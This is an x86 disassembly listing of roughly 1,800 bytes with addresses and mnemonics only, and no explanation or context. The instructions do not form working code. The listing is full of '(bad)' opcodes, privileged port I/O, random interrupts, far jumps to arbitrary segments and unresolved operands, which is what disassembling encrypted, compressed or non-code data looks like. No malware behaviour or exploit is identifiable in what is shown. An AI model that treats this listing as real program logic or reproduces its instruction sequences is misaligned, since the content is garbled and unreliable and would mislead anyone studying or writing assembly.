  41c463:	neg    eax
  41c465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c466:	push   edi
  41c467:	sub    eax,0x9357a129
  41c46c:	xor    ebx,DWORD PTR [edi+0x69]
  41c46f:	les    eax,FWORD PTR [ecx+0x4caeb87]
  41c475:	les    eax,FWORD PTR [ebp-0x61]
  41c478:	imul   esp,DWORD PTR [ecx+esi*4],0x44
  41c47c:	rcl    BYTE PTR [ebx],1
  41c47e:	mov    ah,0x1a
  41c480:	fisub  WORD PTR [edx+0x19b7dd]
	...
  41c48e:	add    BYTE PTR [eax],al
  41c490:	add    BYTE PTR [edi+ecx*2+0x53ff531c],dh
  41c497:	(bad)  
  41c498:	out    dx,eax
  41c499:	inc    esi
  41c49a:	dec    esp
  41c49b:	add    eax,0xc4f16c32
  41c4a0:	ret    0x411d
  41c4a3:	add    DWORD PTR [eax],eax
  41c4a5:	lods   al,BYTE PTR ds:[esi]
  41c4a6:	add    eax,DWORD PTR [eax]
  41c4a8:	add    BYTE PTR [ebx+0x2f189de9],bh
  41c4ae:	bound  eax,QWORD PTR [ebx]
  41c4b0:	rol    BYTE PTR [eax+0x1efc066d],0x37
  41c4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b8:	sub    ch,0xd5
  41c4bb:	push   esp
  41c4bc:	fsub   DWORD PTR [edi]
  41c4be:	imul   eax,edi,0x42d52edc
  41c4c4:	xchg   bl,cl
  41c4c6:	or     edi,edx
  41c4c8:	sub    bl,cl
  41c4ca:	inc    esi
  41c4cb:	fisttp QWORD PTR [bp+si]
  41c4ce:	repz inc esp
  41c4d0:	pop    esp
  41c4d1:	out    0x45,al
  41c4d3:	sub    DWORD PTR [ebp-0x19],edi
  41c4d6:	nop
  41c4d7:	jo     0x41c495
  41c4d9:	ds ds sbb ebp,edi
  41c4dd:	cmc    
  41c4de:	mov    BYTE PTR [ecx-0xfaba9fe],cl
  41c4e4:	sub    eax,0x3b2422c7
  41c4e9:	in     al,dx
  41c4ea:	iret   
  41c4eb:	int    0xa4
  41c4ed:	lock xchg esi,eax
  41c4ef:	push   eax
  41c4f0:	jne    0x41c4c9
  41c4f2:	xchg   ebx,eax
  41c4f3:	daa    
  41c4f4:	cmp    BYTE PTR [ecx+edx*4-0x1527ba9c],cl
  41c4fb:	inc    ecx
  41c4fc:	repnz cmp al,0xdd
  41c4ff:	jbe    0x41c4df
  41c501:	sbb    al,0xcd
  41c503:	inc    edi
  41c504:	popf   
  41c505:	cmc    
  41c506:	cmp    DWORD PTR [edi+edi*4+0x1ac2f782],ebx
  41c50d:	sub    ecx,DWORD PTR [edi+0x49]
  41c510:	dec    edi
  41c511:	cmp    eax,0xa910a72d
  41c516:	dec    edx
  41c517:	push   edi
  41c518:	cmp    al,0x6b
  41c51a:	dec    edx
  41c51b:	loope  0x41c567
  41c51d:	sub    BYTE PTR [esi-0x19],dh
  41c520:	sbb    ebx,ecx
  41c522:	mov    BYTE PTR [eax],al
  41c524:	cs push eax
  41c526:	xor    esi,esp
  41c528:	loopne 0x41c51c
  41c52a:	add    DWORD PTR [ebx],0xffffffb3
  41c52d:	sub    ebx,DWORD PTR [ebp-0x8d82b6f]
  41c533:	cmc    
  41c534:	mov    cl,0xf5
  41c536:	sar    DWORD PTR [ebx],0x20
  41c539:	add    dl,BYTE PTR [eax]
  41c53b:	pop    ebp
  41c53d:	outs   dx,BYTE PTR ds:[esi]
  41c53e:	in     al,dx
  41c53f:	push   edi
  41c540:	cmp    eax,0xb731c0eb
  41c545:	xchg   edi,eax
  41c546:	addr16 aas 
  41c548:	mov    cl,BYTE PTR [edx+0x38]
  41c54b:	jp     0x41c506
  41c54d:	mov    ebx,0x40ee1eda
  41c552:	push   ecx
  41c553:	xor    ecx,0xffffff99
  41c556:	stos   BYTE PTR es:[edi],al
  41c557:	cwde   
  41c558:	and    DWORD PTR [esi-0x6c104d71],ebp
  41c55e:	icebp  
  41c55f:	pop    ebp
  41c560:	cmp    ecx,DWORD PTR [edi-0x381ba693]
  41c566:	xchg   esi,eax
  41c567:	dec    esp
  41c568:	fs cdq 
  41c56a:	mov    bl,0xfd
  41c56c:	sbb    DWORD PTR [edi-0x21],ebx
  41c56f:	das    
  41c570:	sub    DWORD PTR [edx+ebp*8+0x36],ebp
  41c574:	adc    eax,0xa5edd3b1
  41c579:	loope  0x41c5a4
  41c57b:	pop    esi
  41c57c:	cmp    eax,0xa15c92ad
  41c581:	adc    al,0x37
  41c583:	div    DWORD PTR [ecx-0x4]
  41c586:	dec    ecx
  41c587:	(bad)  [eax]
  41c589:	nop
  41c58a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c58b:	(bad)  
  41c58c:	stc    
  41c58d:	or     ebp,DWORD PTR [ebp+0x51]
  41c590:	fs ins DWORD PTR es:[edi],dx
  41c592:	sahf   
  41c593:	push   ecx
  41c594:	push   eax
  41c595:	(bad)  
  41c596:	pop    ss
  41c597:	scas   eax,DWORD PTR es:[edi]
  41c598:	add    eax,0x447ebd70
  41c59d:	push   eax
  41c59e:	fsub   QWORD PTR [edx-0x19]
  41c5a1:	push   esp
  41c5a2:	(bad)  
  41c5a3:	push   edx
  41c5a4:	add    al,0xa1
  41c5a6:	push   cs
  41c5a7:	cwde   
  41c5a8:	dec    ecx
  41c5a9:	mov    dl,BYTE PTR [ebp+0x4bce449e]
  41c5af:	test   eax,0x3c146f06
  41c5b4:	dec    esp
  41c5b5:	dec    ebp
  41c5b6:	adc    eax,DWORD PTR [ebx+0x52]
  41c5b9:	and    BYTE PTR [esi+0x41ba133f],bl
  41c5bf:	out    dx,al
  41c5c0:	ja     0x41c602
  41c5c2:	imul   esi,DWORD PTR [esp+esi*1],0x52
  41c5c6:	and    DWORD PTR [ebx],ebx
  41c5c8:	rcr    DWORD PTR [edi+ebx*1-0x7b],cl
  41c5cc:	push   es
  41c5cd:	(bad)  
  41c5ce:	out    dx,al
  41c5cf:	add    al,0xca
  41c5d1:	pop    edx
  41c5d2:	bsf    edi,DWORD PTR [eax]
  41c5d5:	in     eax,0x7d
  41c5d7:	out    dx,al
  41c5d8:	push   edx
  41c5d9:	shl    BYTE PTR [ecx+0x606d8025],cl
  41c5df:	lahf   
  41c5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5e1:	loope  0x41c5a5
  41c5e3:	dec    eax
  41c5e4:	add    ch,BYTE PTR [eax]
  41c5e6:	sub    BYTE PTR [ebp-0x24],dh
  41c5e9:	inc    eax
  41c5ea:	mov    bl,0xde
  41c5ec:	xchg   eax,esp
  41c5ee:	neg    BYTE PTR [ebx-0x1e262b8f]
  41c5f4:	add    BYTE PTR [edx-0x57],0x81
  41c5f8:	cmp    al,0x39
  41c5fa:	jne    0x41c5e4
  41c5fc:	jne    0x41c666
  41c5fe:	xor    eax,0x62a02aee
  41c603:	push   eax
  41c604:	loop   0x41c5d3
  41c606:	ror    DWORD PTR [edi+0x6adf3823],cl
  41c60c:	lods   eax,DWORD PTR ds:[esi]
  41c60d:	fistp  DWORD PTR [edi]
  41c60f:	inc    edi
  41c610:	cwde   
  41c611:	clc    
  41c612:	cmp    BYTE PTR [esi+0x18],bh
  41c615:	cmc    
  41c616:	out    dx,eax
  41c617:	ss sti 
  41c619:	shl    BYTE PTR [esi],0xf2
  41c61c:	test   BYTE PTR [edx+eax*8-0x541c30f],0x7a
  41c624:	daa    
  41c625:	sar    DWORD PTR [ecx-0x34c33963],1
  41c62b:	cli    
  41c62c:	scas   eax,DWORD PTR es:[edi]
  41c62d:	int    0xca
  41c62f:	scas   al,BYTE PTR es:[edi]
  41c630:	cmp    bh,BYTE PTR [ebx-0xc9655d0]
  41c636:	jns    0x41c5ef
  41c638:	add    al,0xa4
  41c63a:	pop    ebx
  41c63b:	fistp  WORD PTR [esi-0x1d]
  41c63e:	pop    ebx
  41c63f:	test   DWORD PTR [ebx-0x7],0x2861dad
  41c646:	mov    ch,0x34
  41c648:	lahf   
  41c649:	ins    BYTE PTR es:[edi],dx
  41c64a:	mov    ?,WORD PTR [ebp-0xd5b8768]
  41c650:	(bad)  
  41c652:	sub    bl,BYTE PTR [ebx-0x63dcf922]
  41c658:	jle    0x41c5e1
  41c65a:	add    BYTE PTR [esi],ch
  41c65c:	xlat   BYTE PTR es:[ebx]
  41c65e:	push   edx
  41c65f:	sub    BYTE PTR [eax+0x14],ch
  41c662:	sbb    al,0xc6
  41c664:	cmp    DWORD PTR [ebp-0x12e6e954],ebp
  41c66a:	pop    edx
  41c66b:	pop    ebx
  41c66c:	cmc    
  41c66d:	lds    ebx,FWORD PTR [edx]
  41c66f:	inc    ecx
  41c670:	retf   0xf792
  41c673:	adc    BYTE PTR [edi+esi*2-0x34593aad],0x7a
  41c67b:	push   0x1396f8d7
  41c680:	pop    ecx
  41c681:	repnz repz or al,0x5
  41c685:	sbb    eax,0xf0380565
  41c68a:	jmp    0xd1997121
  41c68f:	sbb    dh,ah
  41c691:	fwait
  41c692:	pushf  
  41c693:	int3   
  41c694:	sub    eax,0xebbde62
  41c699:	xor    al,0x77
  41c69b:	adc    DWORD PTR [ebx],eax
  41c69d:	cmp    cl,ch
  41c69f:	add    BYTE PTR [ecx+0x1f7ce2a],dh
  41c6a5:	or     eax,0xc88a0470
  41c6aa:	fwait
  41c6ab:	mov    eax,edx
  41c6ad:	add    ebp,esi
  41c6af:	ds pop ecx
  41c6b1:	cmp    eax,0xaa8d97e2
  41c6b6:	in     al,0x18
  41c6b8:	int    0x5c
  41c6ba:	sub    al,0x73
  41c6bc:	pop    ecx
  41c6bd:	xor    edi,edx
  41c6bf:	fidiv  DWORD PTR [edx+0x5af3da20]
  41c6c5:	mov    dl,0xce
  41c6c7:	adc    DWORD PTR [ebx+0xf],edi
  41c6ca:	lock jno 0x41c6cc
  41c6cd:	les    ebp,FWORD PTR [edx]
  41c6cf:	retf   0x62eb
  41c6d2:	les    edx,FWORD PTR [ecx-0x6d]
  41c6d5:	mov    ch,0x37
  41c6d7:	adc    ecx,DWORD PTR [esi-0x4b]
  41c6da:	jg     0x41c683
  41c6dc:	bnd jo 0x41c674
  41c6df:	(bad)  
  41c6e0:	mov    dl,dh
  41c6e2:	inc    esp
  41c6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6e4:	cmp    eax,0x5998b7a1
  41c6e9:	or     ah,BYTE PTR [ebx-0x514102f1]
  41c6ef:	push   0xfffffff9
  41c6f1:	and    DWORD PTR fs:[edi-0x52],ebp
  41c6f5:	and    DWORD PTR ds:0x5e5534cb,ebp
  41c6fb:	xchg   ecx,eax
  41c6fc:	inc    edx
  41c6fd:	fcmovnbe st,st(7)
  41c6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c700:	fsubr  QWORD PTR [esi-0x72d681c2]
  41c706:	clc    
  41c707:	push   ebx
  41c708:	jp     0x41c6f0
  41c70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c70b:	mov    dl,0xe5
  41c70d:	fisttp WORD PTR [edx-0x13]
  41c710:	mov    bh,0x70
  41c712:	mov    al,ds:0xd6db77ce
  41c717:	stos   DWORD PTR es:[edi],eax
  41c718:	pop    ebp
  41c719:	push   eax
  41c71a:	in     eax,0xe3
  41c71c:	idiv   BYTE PTR ds:0x85121262
  41c722:	(bad)  
  41c723:	or     esp,DWORD PTR [eax-0x3c]
  41c726:	sbb    ebx,0xffffffdf
  41c729:	sti    
  41c72a:	aam    0x18
  41c72c:	or     bl,ch
  41c72e:	mov    ds:0x1642cf6e,eax
  41c733:	mov    bl,0xff
  41c735:	rcr    BYTE PTR [esp+ebp*4-0x6fa55e9],1
  41c73c:	mov    ebx,0x9200a85b
  41c741:	inc    eax
  41c742:	out    0x59,al
  41c744:	(bad)  
  41c745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c746:	or     BYTE PTR [esi],dh
  41c748:	add    al,0xee
  41c74a:	xchg   BYTE PTR [edi-0x15],bh
  41c74d:	inc    eax
  41c74e:	ror    DWORD PTR [eax],cl
  41c750:	or     eax,0xee9cc4ce
  41c755:	clc    
  41c756:	jl     0x41c746
  41c758:	ja     0x41c75e
  41c75a:	ss jl  0x41c721
  41c75d:	jmp    0x41c7d2
  41c75f:	xor    DWORD PTR [edi-0x537bf53e],edx
  41c765:	cld    
  41c766:	xor    eax,0x2bf352be
  41c76b:	xchg   edi,eax
  41c76c:	xchg   esi,eax
  41c76d:	jecxz  0x41c760
  41c76f:	add    BYTE PTR [ebx],dh
  41c771:	dec    ebp
  41c772:	push   0xffffff93
  41c774:	dec    ecx
  41c775:	adc    DWORD PTR [esi],edi
  41c777:	dec    ebx
  41c778:	sbb    edx,DWORD PTR [esp+eiz*4-0x56c5ea60]
  41c77f:	cli    
  41c780:	push   0x78f2ddb5
  41c785:	call   0x1cbc:0x239715aa
  41c78c:	mov    al,0x2a
  41c78e:	mov    edi,0x695251ef
  41c793:	jp     0x41c7f8
  41c795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c796:	leave  
  41c797:	fmulp  st(5),st
  41c799:	dec    eax
  41c79a:	enter  0x509f,0x45
  41c79e:	lahf   
  41c79f:	scas   al,BYTE PTR es:[edi]
  41c7a0:	xor    al,cl
  41c7a2:	xor    DWORD PTR [eax+0x13],esp
  41c7a5:	mov    ecx,0x6933f21d
  41c7aa:	js     0x41c768
  41c7ac:	mov    cl,0x2c
  41c7ae:	jge    0x41c762
  41c7b0:	adc    DWORD PTR ds:0x195bc1ca,ecx
  41c7b6:	xchg   BYTE PTR [esi],bl
  41c7b8:	retf   
  41c7b9:	pushf  
  41c7ba:	fucom  st(5)
  41c7bc:	loop   0x41c836
  41c7be:	sbb    al,0xf5
  41c7c0:	dec    esi
  41c7c1:	scas   al,BYTE PTR es:[edi]
  41c7c2:	mov    eax,0xceb8ca70
  41c7c7:	xor    eax,0x179fa99a
  41c7cc:	pop    ecx
  41c7cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7ce:	mov    dl,0x5a
  41c7d0:	bnd cs jo 0x41c826
  41c7d4:	cs (bad) 
  41c7d6:	adc    eax,0x33da08fe
  41c7db:	addr16 push ebx
  41c7dd:	retf   
  41c7de:	dec    ebp
  41c7df:	or     dh,BYTE PTR [esp+ebp*1-0x1be2a51c]
  41c7e6:	xchg   ch,ch
  41c7e8:	push   ss
  41c7e9:	shl    ecx,cl
  41c7eb:	cmp    esi,eax
  41c7ed:	or     ch,BYTE PTR [eax]
  41c7ef:	ficomp DWORD PTR [edi-0x6c]
  41c7f2:	adc    BYTE PTR [ecx+0x3e8b8264],0x8d
  41c7f9:	stos   DWORD PTR es:[edi],eax
  41c7fa:	fst    QWORD PTR [esi+0x27]
  41c7fd:	mov    dl,0x88
  41c7ff:	xor    eax,0xaf629318
  41c804:	shl    DWORD PTR [esi+0x7bb73b3f],0x4
  41c80b:	push   cs
  41c80c:	gs pop esp
  41c80e:	mov    esp,DWORD PTR [ebp-0x4f]
  41c811:	dec    esp
  41c812:	jmp    0x9baf:0x4b11206e
  41c819:	ins    DWORD PTR es:[edi],dx
  41c81a:	cmp    BYTE PTR [ecx],ah
  41c81c:	inc    eax
  41c81d:	jae    0x41c7b6
  41c81f:	mov    bh,0xfe
  41c821:	push   cs
  41c822:	mov    dl,0x5f
  41c824:	sbb    DWORD PTR [esi+0x4d34a066],ecx
  41c82a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c82b:	mov    ecx,0x414d2ef0
  41c830:	dec    ecx
  41c831:	in     eax,dx
  41c832:	rcr    BYTE PTR [eax],0x1c
  41c835:	fs ret 0x343b
  41c839:	inc    edx
  41c83a:	push   ss
  41c83b:	xor    BYTE PTR [edx+0x2d],cl
  41c83e:	call   0x41f8:0x980dfc98
  41c845:	pushf  
  41c846:	cmp    edi,DWORD PTR [ecx-0x387cc6a6]
  41c84c:	test   DWORD PTR [ecx-0x2a],esp
  41c84f:	push   ds
  41c850:	jle    0x41c882
  41c852:	pop    ds
  41c853:	cli    
  41c854:	fadd   DWORD PTR [eax]
	...
  41c85e:	add    BYTE PTR [eax],al
  41c860:	add    ah,al
  41c862:	leave  
  41c863:	or     BYTE PTR [eax-0x12131ef3],ah
  41c869:	add    BYTE PTR [esi-0x1e],al
  41c86c:	or     eax,ebp
  41c86e:	lods   eax,DWORD PTR ds:[esi]
  41c86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c870:	dec    ebp
  41c871:	leave  
  41c872:	inc    esp
  41c873:	add    DWORD PTR [eax],eax
  41c875:	lods   al,BYTE PTR ds:[esi]
  41c876:	add    eax,DWORD PTR [eax]
  41c878:	add    BYTE PTR [edx],dh
  41c87a:	jge    0x41c8eb
  41c87c:	adc    BYTE PTR [ecx+ebx*1+0x42],0xf2
  41c881:	inc    eax
  41c882:	mov    ebx,0x57d32b02
  41c887:	pop    ds
  41c888:	sbb    ah,BYTE PTR [ebx+0x48]
  41c88b:	sub    DWORD PTR [ecx+0x15],0x2f
  41c88f:	jl     0x41c896
  41c891:	xor    edx,ebx
  41c893:	fild   WORD PTR [bp+di-0x7]
  41c897:	or     eax,0x9c0ec814
  41c89c:	sub    BYTE PTR [ebx],bl
  41c89e:	mov    DWORD PTR [eax+0x12],edx
  41c8a1:	cld    
  41c8a2:	mov    al,0x4c
  41c8a4:	shr    DWORD PTR [ebx-0xbb28556],1
  41c8aa:	and    cl,BYTE PTR [eax]
  41c8ac:	ds cmp edx,DWORD PTR gs:[ebx]
  41c8b0:	(bad)  
  41c8b1:	out    dx,al
  41c8b2:	lock mov esp,0xbed8a5e7
  41c8b8:	inc    ecx
  41c8b9:	and    eax,DWORD PTR [edx+0x19]
  41c8bc:	aad    0xaf
  41c8be:	test   eax,0x6eb09688
  41c8c3:	mov    gs,edi
  41c8c5:	(bad)  
  41c8c7:	push   esi
  41c8c8:	fisttp WORD PTR [edi]
  41c8ca:	sub    ebp,DWORD PTR [edi+edx*8+0x6e6144a]
  41c8d1:	(bad)  
  41c8d2:	pop    ds
  41c8d3:	sbb    al,0xc7
  41c8d5:	cs inc edi
  41c8d7:	pop    edx
  41c8d8:	add    ebp,0x549cb1bc
  41c8de:	fwait
  41c8df:	push   0xb2fe1d8f
  41c8e4:	inc    edx
  41c8e5:	jp     0x41c924
  41c8e7:	in     al,dx
  41c8e8:	push   ds
  41c8e9:	scas   eax,DWORD PTR es:[edi]
  41c8ea:	mov    ds:0x5fbddcb3,al
  41c8ef:	push   edi
  41c8f0:	dec    esp
  41c8f1:	das    
  41c8f2:	aas    
  41c8f3:	jne    0x41c96d
  41c8f5:	adc    ch,dl
  41c8f7:	(bad)  
  41c8f8:	outs   dx,BYTE PTR ds:[esi]
  41c8f9:	dec    ecx
  41c8fa:	push   esp
  41c8fb:	pop    eax
  41c8fc:	jns    0x41c95a
  41c8fe:	test   eax,0x95b8b732
  41c903:	or     ah,BYTE PTR [esi+ecx*4]
  41c906:	imul   BYTE PTR [esi+0x1f]
  41c909:	inc    eax
  41c90a:	(bad)  
  41c90b:	rcl    ch,cl
  41c90d:	jnp    0x41c8bc
  41c90f:	(bad)
  41c913:	jne    0x41c8a4
  41c915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c916:	ret    0xb45
  41c919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c91a:	jmp    0x41c8f6
  41c91c:	or     BYTE PTR [ecx],0xc6
  41c91f:	leave  
  41c920:	pop    ds
  41c921:	rcl    BYTE PTR [eax],0xb
  41c924:	test   eax,0xa59b9ce8
  41c929:	jge    0x41c968
  41c92b:	sub    eax,0xc329fedb
  41c930:	dec    esp
  41c931:	cli    
  41c932:	fist   DWORD PTR [ebx+0x30]
  41c935:	call   0x9054cc7b
  41c93a:	inc    ecx
  41c93b:	scas   al,BYTE PTR es:[edi]
  41c93c:	loope  0x41c932
  41c93e:	ja     0x41c975
  41c940:	xor    al,0x92
  41c942:	mov    esp,0xad8d957
  41c947:	xor    eax,0xd694c59c
  41c94c:	je     0x41c8ff
  41c94e:	neg    esp
  41c950:	push   ebp
  41c951:	mov    esp,0x7b6dc7c5
  41c956:	hlt    
  41c957:	fsubr  QWORD PTR [ebp-0xaf1b54f]
  41c95d:	into   
  41c95e:	push   ebp
  41c95f:	sub    eax,0x39f789d3
  41c964:	mov    ebx,DWORD PTR [edi+0x79861d90]
  41c96a:	cmp    BYTE PTR [eax-0x1fa3d8e8],ch
  41c970:	add    BYTE PTR [ecx-0x7611c03f],0x7d
  41c977:	sbb    al,0xc5
  41c979:	dec    ebp
  41c97a:	and    cl,BYTE PTR [edi]
  41c97c:	xchg   ecx,eax
  41c97d:	outs   dx,DWORD PTR ds:[esi]
  41c97e:	pop    edi
  41c97f:	pop    edx
  41c980:	xchg   DWORD PTR ds:0xf49955b4,esp
  41c986:	sub    ecx,DWORD PTR [ecx+0x5e28b887]
  41c98c:	test   DWORD PTR [eax+0x70],edx
  41c98f:	data16 lods al,BYTE PTR ds:[esi]
  41c991:	fnstenv [ecx+0x54c33c85]
  41c997:	sti    
  41c998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c999:	js     0x41c962
  41c99b:	sub    DWORD PTR [edx-0x2f16ac5b],ecx
  41c9a1:	and    eax,DWORD PTR [ecx-0x10]
  41c9a4:	mov    BYTE PTR [ecx-0x426e1d43],ah
  41c9aa:	add    BYTE PTR [edx-0x47],ah
  41c9ad:	push   cs
  41c9ae:	mov    ah,0x38
  41c9b0:	mov    cl,ch
  41c9b2:	cmp    dh,BYTE PTR [esi+0x4db0b2e8]
  41c9b8:	mov    cl,0x7c
  41c9ba:	push   es
  41c9bb:	mov    esi,0xd112e70
  41c9c0:	add    esp,DWORD PTR [ebx+0x71f20f4a]
  41c9c6:	dec    edx
  41c9c7:	and    BYTE PTR [eax],0x22
  41c9ca:	outs   dx,BYTE PTR ds:[esi]
  41c9cb:	lock in al,dx
  41c9cd:	scas   eax,DWORD PTR es:[edi]
  41c9ce:	lods   eax,DWORD PTR ds:[esi]
  41c9cf:	int    0x9e
  41c9d1:	lods   eax,DWORD PTR ds:[esi]
  41c9d2:	push   eax
  41c9d3:	push   ecx
  41c9d4:	out    dx,al
  41c9d5:	pop    ebx
  41c9d6:	mov    cl,bl
  41c9d8:	in     eax,0x69
  41c9da:	dec    ebp
  41c9db:	out    dx,al
  41c9dc:	rcl    DWORD PTR [edi+eax*2-0x69d2646e],0xe3
  41c9e4:	cwde   
  41c9e5:	out    dx,eax
  41c9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e7:	xchg   DWORD PTR [edx-0x4e],eax
  41c9ea:	js     0x41ca1b
  41c9ec:	fcmovnu st,st(1)
  41c9ee:	stc    
  41c9ef:	daa    
  41c9f0:	inc    esp
  41c9f1:	dec    eax
  41c9f2:	je     0x41c9ed
  41c9f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9f5:	out    dx,eax
  41c9f6:	in     eax,dx
  41c9f7:	pusha  
  41c9f8:	dec    ebp
  41c9f9:	sub    esi,DWORD PTR [edi]
  41c9fb:	mov    esp,DWORD PTR ds:0xb93cbe0a
  41ca01:	pusha  
  41ca02:	aas    
  41ca03:	sub    esi,ebx
  41ca05:	pop    ss
  41ca06:	loopne 0x41c995
  41ca08:	fs push esp
  41ca0a:	xor    eax,0xdc5e0afb
  41ca0f:	cmp    esi,ebp
  41ca11:	mov    ecx,0x95d566d
  41ca16:	adc    al,0x48
  41ca18:	or     DWORD PTR [ebx+eiz*8-0x39],esi
  41ca1c:	imul   edx,DWORD PTR [esi],0xffffffc0
  41ca1f:	je     0x41c9dd
  41ca21:	lock push ss
  41ca23:	data16 sub al,0x7a
  41ca26:	lods   al,BYTE PTR ds:[esi]
  41ca27:	push   edi
  41ca28:	dec    eax
  41ca29:	mov    WORD PTR [esi],?
  41ca2b:	xor    DWORD PTR [eax-0x22ca6bda],ecx
  41ca31:	imul   edx,DWORD PTR [eax],0x4b8becc5
  41ca37:	ret    0xf127
  41ca3a:	or     DWORD PTR [ebx+0x2d],edx
  41ca3d:	out    dx,al
  41ca3e:	push   ss
  41ca3f:	out    0xa6,al
  41ca41:	mov    dh,0xdf
  41ca43:	aaa    
  41ca44:	xchg   ecx,eax
  41ca45:	dec    eax
  41ca46:	inc    edi
  41ca47:	sbb    DWORD PTR [esi-0x71b7a11e],0xc73ae5e6
  41ca51:	sti    
  41ca52:	add    BYTE PTR [edx-0x7a],bl
  41ca55:	ficom  WORD PTR [edx]
  41ca57:	xchg   ebx,eax
  41ca58:	stos   BYTE PTR es:[edi],al
  41ca59:	adc    DWORD PTR [eax+edi*2+0x16],0x5d
  41ca5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca5f:	mov    ebx,0xba7f26ca
  41ca64:	and    eax,0xc2c6c66a
  41ca69:	in     eax,dx
  41ca6a:	into   
  41ca6b:	fnsave [eax]
  41ca6d:	js     0x41ca69
  41ca6f:	and    bh,0x42
  41ca72:	add    DWORD PTR [ebp-0x1d],edx
  41ca75:	jno    0x41ca54
  41ca77:	dec    edi
  41ca78:	push   ds
  41ca79:	pop    edx
  41ca7a:	jb     0x41caaa
  41ca7c:	pushf  
  41ca7d:	js     0x41ca29
  41ca7f:	and    BYTE PTR [ebx-0x19],0x54
  41ca83:	shl    DWORD PTR [ebx],0x2f
  41ca86:	ds sahf 
  41ca88:	fdiv   DWORD PTR [ebx-0x65b8a44]
  41ca8e:	sbb    edi,esi
  41ca90:	out    dx,eax
  41ca91:	imul   ebp,ecx,0x9b838194
  41ca97:	fs popa 
  41ca99:	or     ecx,DWORD PTR [ecx-0x49476c47]
  41ca9f:	mov    esp,DWORD PTR [edx+0x22]
  41caa2:	xchg   BYTE PTR [esp+ebp*1-0x108376fd],cl
  41caa9:	out    dx,eax
  41caaa:	and    eax,0x17519de7
  41caaf:	pshufw mm1,QWORD PTR [esi],0x4c
  41cab3:	jmp    0xc792:0x59e3edd4
  41caba:	add    BYTE PTR [ebx],0xeb
  41cabd:	rcr    al,0x9b
  41cac0:	mov    ch,0x7f
  41cac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cac3:	jecxz  0x41ca7d
  41cac5:	fucomi st,st(2)
  41cac7:	xbegin 0x1bd382ca
  41cacd:	mov    ds:0xb2d01799,eax
  41cad2:	je     0x41caef
  41cad4:	data16 fnstcw WORD PTR [ebx+0x33]
  41cad8:	pushf  
  41cad9:	push   ebx
  41cada:	cld    
  41cadb:	in     eax,dx
  41cadc:	into   
  41cadd:	shl    BYTE PTR [ebx-0x1496cdf3],0xd5
  41cae4:	push   edx
  41cae5:	pop    ss
  41cae6:	(bad)  
  41cae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cae8:	rcl    BYTE PTR [ebx+0x1e],cl
  41caeb:	dec    ebp
  41caec:	popf   
  41caed:	cwde   
  41caee:	pmulhuw mm4,QWORD PTR [esi+0x215b61ac]
  41caf5:	push   ds
  41caf6:	push   cs
  41caf7:	pop    ecx
  41caf8:	mov    ebp,0x1f7b9159
  41cafd:	push   es
  41cafe:	mov    dh,0xd0
  41cb00:	outs   dx,DWORD PTR ds:[esi]
  41cb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb02:	jae    0x41cb72
  41cb04:	scas   eax,DWORD PTR es:[edi]
  41cb05:	add    DWORD PTR [edi-0x1c],ebx
  41cb08:	mov    bh,0x62
  41cb0a:	add    eax,0xbec0305d
  41cb0f:	mov    dl,al
  41cb11:	cli    
  41cb12:	xchg   edi,eax
  41cb13:	mov    ecx,0x9a02b3f3
  41cb18:	sahf   
  41cb19:	mov    dl,0x4
  41cb1b:	dec    edi
  41cb1c:	in     eax,dx
  41cb1d:	iret   
  41cb1e:	xchg   ebp,eax
  41cb1f:	sbb    BYTE PTR [ebx+esi*2-0x69c07dad],bl
  41cb26:	sbb    eax,0xe260a25d
  41cb2b:	hlt    
  41cb2c:	inc    edx
  41cb2d:	out    dx,eax
  41cb2e:	xchg   edi,ecx
  41cb30:	xlat   BYTE PTR ds:[ebx]
  41cb31:	push   ebp
  41cb32:	idiv   BYTE PTR [eax]
  41cb34:	sub    BYTE PTR [edx-0x9b79f4c],cl
  41cb3a:	pushw  cs
  41cb3c:	call   0xa8aaf0e5
  41cb41:	pop    eax
  41cb42:	xchg   ecx,eax
  41cb43:	fist   WORD PTR [edi+0x69]
  41cb46:	cmp    al,0xe0
  41cb48:	mov    esi,0xf39b0f31
  41cb4d:	mov    eax,ds:0xf0d726ae
  41cb52:	gs dec esi
  41cb54:	sub    eax,ebx
  41cb56:	xor    DWORD PTR [esi],0x853aef6f
  41cb5c:	imul   ebp,DWORD PTR [edx+ebx*8+0x61f312f1],0x4a
  41cb64:	sbb    al,0xbc
  41cb66:	add    bh,BYTE PTR [ebx+0x5d]
  41cb69:	inc    ecx
  41cb6b:	xchg   BYTE PTR [edi+0x58],ch
  41cb6e:	xchg   DWORD PTR [eax],edx
  41cb70:	les    esp,FWORD PTR [eax-0x63]
  41cb73:	mov    eax,ds:0xe02e21b5
  41cb78:	sub    BYTE PTR [eax-0x1bd46f01],bh
  41cb7e:	push   0xaa9e6705
  41cb83:	dec    esi
  41cb84:	gs jp  0x41cbaf
  41cb87:	pop    edx
  41cb88:	cmp    edi,ebx
  41cb8a:	inc    esp
  41cb8b:	xchg   edx,eax
  41cb8c:	add    al,0x1a
  41cb8e:	xor    al,0xd
  41cb90:	bound  eax,QWORD PTR [edi-0x60]
  41cb93:	xchg   ebp,eax
